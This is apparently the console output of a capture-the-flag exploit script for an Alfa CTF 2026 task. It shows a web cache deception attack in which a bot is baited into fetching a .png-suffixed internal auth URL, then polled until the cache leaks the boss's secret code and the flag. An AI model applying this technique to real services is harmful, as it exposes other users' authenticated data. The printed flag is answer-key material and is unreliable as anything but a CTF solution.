@@ -1,0 +1,17 @@
+/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/noonechilled/solve/exploit.py:11: SyntaxWarning: "\s" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\s"? A raw string is also an option.
+  - boss-bot's url-detector regex (`https?://[^\s]+`) AND its image-extension
+[register] 200 {"message":"Регистрация успешна","user":{"id":"1a853d5e-5edd-4e1e-b81f-be67aed30350","email":"pwn-1lgpljzyi6@example.com","display_name":"pwner-1va4bf","role":"employee"}}
+[register] OK as pwn-1lgpljzyi6@example.com (id=1a853d5e-5edd-4e1e-b81f-be67aed30350)
+[ensure-boss-dm] 200 {"kind":"dm","title":"Чат с The Boss","id":"2d93b722-149d-4ee4-a80b-a8072afaf634","created_by":"1a853d5e-5edd-4e1e-b81f-be67aed30350","created_at":"2026-04-28T12:14:20.658283","is_active":true,"unread
+[+] DM room id: 2d93b722-149d-4ee4-a80b-a8072afaf634
+[+] Bait URL (bot will fetch): http://nginx/xhr/api/auth/vacation-approval/bc17a892dd264857bf8f29872f460921.png
+[+] Bait URL (we will poll):   https://noonechilled-3wbd3hhx.alfactf.ru/xhr/api/auth/vacation-approval/bc17a892dd264857bf8f29872f460921.png
+[send_bait] 200 body='Привет, босс! Можно отпуск? Вот мем для контекста: http://nginx/xhr/api/auth/vacation-approval/bc17a892dd264857bf8f29872f460921.png'
+[+] Bait sent. Polling unauth GET on the bait URL until cache populates...
+[poll 1/30] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 2/30] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 3/30] 200 cache=HIT ct=application/json body={"code":"LKOY4UPZETJXR3QXNMDN","boss_name":"The Boss"}
+[+] Leaked: {'code': 'LKOY4UPZETJXR3QXNMDN', 'boss_name': 'The Boss'}
+[vacation] 200 {"message":"Аккаунт деактивирован. Приятного отпуска!","data":{"flag":"alfa{chilL_R3aRm_chIlL_RearM_ch1lL_REARm_chilL}"}}
+
+[SOLVED] alfa{chilL_R3aRm_chIlL_RearM_ch1lL_REARm_chilL}
